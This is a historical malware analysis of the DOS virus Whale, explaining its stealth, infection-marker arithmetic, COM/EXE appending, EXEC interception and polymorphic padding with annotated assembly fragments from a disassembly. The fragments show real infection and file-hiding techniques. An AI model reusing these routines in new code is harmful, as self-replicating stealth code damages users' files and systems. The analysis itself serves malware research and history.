Whale coordinates the file's apparent contents with its directory metadata. The top bit of the packed DOS time word acts as an infection marker; numerically it represents sixteen hours. For marked results from a successful handle-based directory search, the virus subtracts `2400h` from the returned size, propagates the borrow into the high word and removes the time marker. FCB directory searches apply equivalent corrections to their differently arranged results. [Handle directory correction](../listings/Virus.DOS.Whale.asm#L5463), [FCB directory correction](../listings/Virus.DOS.Whale.asm#L2082).

```asm
    SUB     word ptr [BX + 0x1a],virus_append_bytes
    SBB     word ptr [BX + 0x1c],0x0
    SUB     byte ptr [BX + find_result_time_high_offset],0x80
```

Seek-from-end requests for marked files are also adjusted: the virus subtracts its append from the caller's saved displacement before passing the call to DOS. This makes the physical seek land at the corresponding position relative to the original host's EOF. [Seek adjustment](../listings/Virus.DOS.Whale.asm#L5109).

```asm
    SUB     word ptr [BP + -0xa],virus_append_bytes
    SBB     word ptr [BP + saved_cx_frame_offset],0x0
```

Time queries hide the marker, while time-setting requests first strip it from the requested value and then restore it if the file was already marked. Ordinary timestamp changes therefore preserve the virus's internal classification. [Time query](../listings/Virus.DOS.Whale.asm#L4978), [time-setting decision](../listings/Virus.DOS.Whale.asm#L5022).

```asm
    CALL    query_handle_infection_timestamp
    JZ      chain_set_timestamp
    ADD     CH,0x80
```

### Arithmetic infection markers and extension recognition

Whale recognizes an infected COM header through a relationship between its first three words. With 16-bit arithmetic, the test is `w0 + w1 + (w2 XOR 5348h XOR 4649h) == 0`. The marker changes with the preceding header words, including the entry jump, instead of occupying a fixed identifying word. The recognition routine accumulates the sum in AX and branches on zero afterward. [Marker test](../listings/Virus.DOS.Whale.asm#L3333).

```asm
    MOV     AX,word ptr [SI]
    ADD     AX,word ptr [SI + 0x2]
    PUSH    BX
    MOV     BX,word ptr [SI + 0x4]
    XOR     BX,com_marker_wh
    XOR     BX,com_marker_if
    ADD     AX,BX
    POP     BX
```

The writer constructs the matching third word by negating the first-two-word sum and applying the same XOR constants. A separate arithmetic shortcut classifies filenames: it folds the last three characters to uppercase, adds them and compares the result with `DFh` for COM or `E2h` for EXE. This avoids literal `COM` and `EXE` strings in the classifier; the two uses of arithmetic serve different purposes, header recognition and file selection. [Marker construction](../listings/Virus.DOS.Whale.asm#L3927), [extension classifier](../listings/Virus.DOS.Whale.asm#L4416).

```asm
    MOV     AX,word ptr [DI + -0x3]
    AND     AX,0xdfdf
    ADD     AH,AL
    MOV     AL,byte ptr [DI + -0x4]
    AND     AL,0xdf
    ADD     AL,AH
```

### Paragraph-aligned COM/EXE infection

Whale aligns the appended body to a sixteen-byte paragraph while keeping ordinary file growth at `2400h` bytes. It saves the original EOF in DI, rounds DX:AX upward and subtracts the rounded low word from DI. DI consequently holds the negative alignment gap. The writer adds that adjustment to its `2400h`-byte count, shortening the expendable tail by the bytes introduced before the body. [Alignment calculation](../listings/Virus.DOS.Whale.asm#L4029), [adjusted append count](../listings/Virus.DOS.Whale.asm#L4077).

```asm
    MOV     DI,AX
    ADD     AX,paragraph_rounding_bias
    ADC     DX,0x0
    AND     AX,0xfff0
    SUB     DI,AX
    MOV     CX,paragraph_bytes
    DIV     CX
    MOV     SI,AX
```

SI now holds the append's paragraph position. For COM files, multiplying it by sixteen and adding `23B9h` creates the displacement from the three-byte entry jump to the decoder at body offset `23BCh`. [COM entry construction](../listings/Virus.DOS.Whale.asm#L3917).

```asm
    MOV     CL,0xe9
    MOV     AX,paragraph_bytes
    MOV     byte ptr [file_header_buffer],CL
    MUL     SI
    ADD     AX,0x23b9
    MOV     [com_jump_displacement_buffer],AX
```

For EXE files, Whale instead subtracts the MZ header's paragraph count to obtain the module-relative segment. It uses that segment for CS and SS, sets IP to one and SP to `FFFEh`, and adds eighteen 512-byte pages to the declared size. The original header remains available for restoration. [EXE header rewrite](../listings/Virus.DOS.Whale.asm#L3828).

```asm
    MOV     word ptr [file_header_word_14],infected_exe_entry_ip
    MOV     AX,SI
    SUB     AX,word ptr [file_header_word_08]
    MOV     [file_header_word_16],AX
    ADD     word ptr [file_header_word_04],0x12
    MOV     word ptr [file_header_word_10],0xfffe
    MOV     [file_header_word_0e],AX
```

### Intercepting DOS loading and restoring host execution state

Whale intercepts EXEC closely enough to separate loading from execution. For a load-and-run request it saves the caller's return context and copies the parameter block, then asks DOS to load without executing through `AX=4B01h`. That gives the resident virus access to the child image before its entry point runs. [Load-only substitution](../listings/Virus.DOS.Whale.asm#L3036).

```asm
    PUSH    CS
    MOV     AX,0x4b01
    POP     ES
    PUSHF
    MOV     BX,exec_parameter_block_copy
    CALLF   [dos_service_entry]
```

For a recognized infected COM, the entry jump locates the appended body and its saved first six host bytes. Whale copies them back over the loaded jump and marker. The file remains infected while the child's visible entry instructions become the original program's. [Loaded COM restoration](../listings/Virus.DOS.Whale.asm#L3422).

```asm
    MOV     BX,word ptr [SI + 0x1]
    MOV     AX,word ptr [BX + SI + saved_com_word0_relative]
    MOV     word ptr [SI],AX
    MOV     AX,word ptr [BX + SI + saved_com_word1_relative]
    MOV     word ptr [SI + 0x2],AX
    MOV     AX,word ptr [BX + SI + saved_com_word2_relative]
    MOV     word ptr [SI + 0x4],AX
```

EXE restoration rebuilds CS:IP and SS:SP from the saved header, adding the child's load segment to relative segment values. Whale also repairs the PSP termination address and transfers to the restored entry. Explicit load-only requests have their own path, which repairs the returned EXEC parameter block without starting the child. [EXE startup restoration](../listings/Virus.DOS.Whale.asm#L3125), [termination and transfer](../listings/Virus.DOS.Whale.asm#L3386), [explicit load-only repair](../listings/Virus.DOS.Whale.asm#L3565).

### Deferred infection on close, attribute preservation and error handling

Whale can defer infection until a file is closed. A candidate open obtains a read/write handle and records it alongside the current PSP in paired twenty-word tables. The PSP distinguishes identical handle numbers belonging to different processes. On close, the virus scans for the PSP and then compares the associated handle; a match clears that entry and invokes the infection routine before completing the close. [Tracking setup](../listings/Virus.DOS.Whale.asm#L2805), [matching close](../listings/Virus.DOS.Whale.asm#L2868).

```asm
    REPNE   SCASW
    JNZ     handle_close_file_at_0a17
    CMP     BX,word ptr ES:[DI + tracked_handle_displacement]
    JNZ     handle_close_file_at_09fc
    MOV     word ptr ES:[DI + -0x2],0x0
    CALL    check_mz_header
```

The surrounding file handling saves the pathname and attributes, clears the attributes before opening the candidate read/write, and restores them during cleanup. This lets the mutation path cross a read-only attribute without leaving that attribute visibly changed. [Attribute clearing](../listings/Virus.DOS.Whale.asm#L4688), [cleanup](../listings/Virus.DOS.Whale.asm#L3953).

```asm
    MOV     AX,dos_set_attributes
    XOR     CX,CX
    CALL    word ptr CS:[dos_call_helper_pointer]
```

A temporary INT 24 handler returns the DOS ignore result and sets the candidate's skip flag. Consequently, a critical error can abandon that candidate without displaying the usual interactive error prompt. The saved interrupt vectors are restored with the other cleanup. [Critical-error response](../listings/Virus.DOS.Whale.asm#L4777), [handler installation](../listings/Virus.DOS.Whale.asm#L5641).

```asm
    XOR     AL,AL
    MOV     byte ptr CS:[candidate_open_mode],candidate_skip_mode
```

### Randomized fields, padding and memory-derived trailing bytes

A timer-selected COM variant changes expendable bytes as well as encryption. It randomizes body offsets `000Ah–001Fh`, leaving the six saved host bytes at `0004h–0009h` intact, and also varies the appended body's three-byte prefix. The physical host entry jump remains separately constructed. BX points at the expendable fields, while repeated PIT reads supply their replacement values. [COM randomization](../listings/Virus.DOS.Whale.asm#L4208).

```asm
    MOV     BX,offset saved_host_header+0x6
    MOV     CX,0x16
randomize_com_saved_header_fields_at_10e4:
    IN      AL,pit_counter_zero_port
    MOV     byte ptr CS:[BX],AL
    INC     BX
    LOOP    randomize_com_saved_header_fields_at_10e4
```

The same flag enables an additional write from a timer-selected segment between `0000h` and `00FFh`, at offset `0400h`. Two more timer reads form a count masked to twelve bits, producing a requested append length of 0–4,095 bytes. The flag also suppresses adding the ordinary time marker to an unmarked timestamp. [Optional memory append](../listings/Virus.DOS.Whale.asm#L4276), [timestamp choice](../listings/Virus.DOS.Whale.asm#L4164).

```asm
    XOR     AX,AX
    IN      AL,pit_counter_zero_port
    MOV     DS,AX
    MOV     DX,0x400
    IN      AL,pit_counter_zero_port
    XCHG    AL,AH
    IN      AL,pit_counter_zero_port
    MOV     CX,AX
    AND     CH,0xf
    MOV     AH,dos_write
    CALL    word ptr CS:[dos_call_helper_pointer]
```

Even the ordinary tail uses existing memory: ES is zero, a timer-derived SI selects a word, and BX advances only one byte between stores. Fourteen overlapping word writes fill fifteen trailing bytes. Timer input therefore selects memory contents as well as contributing bytes directly. [Trailing-byte generation](../listings/Virus.DOS.Whale.asm#L4348).

```asm
randomize_trailing_bytes_at_119f:
    IN      AX,pit_counter_zero_port
    MOV     SI,AX
    PUSH    word ptr ES:[SI]
    POP     word ptr [BX]
    INC     BX
    LOOP    randomize_trailing_bytes_at_119f
```

## Curiosities

### Propagation stops from April 1991

Whale has a built-in expiration date for new infections. Its date gate permits propagation before 1991 and through March of that year, then disables it from April 1, 1991 onward. This gives the virus a lifetime determined by the DOS clock. The resident code can remain active after propagation stops, and the seasonal message has its own calendar condition. [Infection cutoff](../listings/Virus.DOS.Whale.asm#L3619).

### The hidden sector backup and its cryptic warning

A timer-gated path copies the first hard disk's first sector into hidden `C:\FISH-#9.TBL`. A create-new operation preserves any existing file of that name. A successful complete write contains the 512-byte sector followed by a 155-byte warning, for 667 bytes in all. [Backup routine](../listings/Virus.DOS.Whale.asm#L2107).

The warning reads:

> FISH VIRUS #9  A Whale is no Fish! Mind her Mutant Fish and the hidden Fish Eggs for they are damaging. The sixth Fish mutates only if Whale is in her Cave

The filename, hidden attribute and riddle suggest something waiting to be discovered. Contemporary analysts considered a possible reference to Fish 6, but the message's claim of interaction remained unsubstantiated. VSUM describes attempts to run the two together that produced identifiable infections by both viruses without the promised mutation. [Stored warning](../listings/Virus.DOS.Whale.asm#L2219), [contemporary discussion](../references/virus_bulletin/199011-p17-whale-a-dinosaur-heading-for-extinction.txt), [VSUM account](../references/vsum/whale.txt).

### The Pisces message and the supposed 1991 exemption

From February 19 through March 20, Whale's seasonal payload displays:

```text
THE WHALE IN SEARCH OF THE 8 FISH
I AM '~knzyvo}' IN HAMBURG
```

The dates match the Pisces theme identified in the contemporary *Virus Bulletin* report. The same report described an exemption for 1991, but this specimen's trigger checks only the month and day. Its message season consequently overlaps the final weeks before the separate propagation cutoff. [Message and trigger](../listings/Virus.DOS.Whale.asm#L5122), [November 1990 account](../references/virus_bulletin/199011-p17-whale-a-dinosaur-heading-for-extinction.txt).

### TADPOLES, Hamburg and fish wordplay

Subtracting 42 from each character in `~knzyvo}` yields `TADPOLES`, the interpretation proposed in the contemporary analysis. The message supplies a Hamburg claim, but neither the encoded name nor the location establishes the author's identity or origin. [Stored message](../listings/Virus.DOS.Whale.asm#L5173), [contemporary interpretation](../references/virus_bulletin/199011-p17-whale-a-dinosaur-heading-for-extinction.txt).

Fish wordplay also appears in the infection marker. The constants `4649h` and `5348h` spell `FI` and `SH` when their hexadecimal bytes are read in written, high-byte-first order. That ordering differs from how the words are stored in little-endian memory. Even a calculation used to recognize infected files carries the same theme as the messages and hidden backup. [Marker calculation](../listings/Virus.DOS.Whale.asm#L3336).
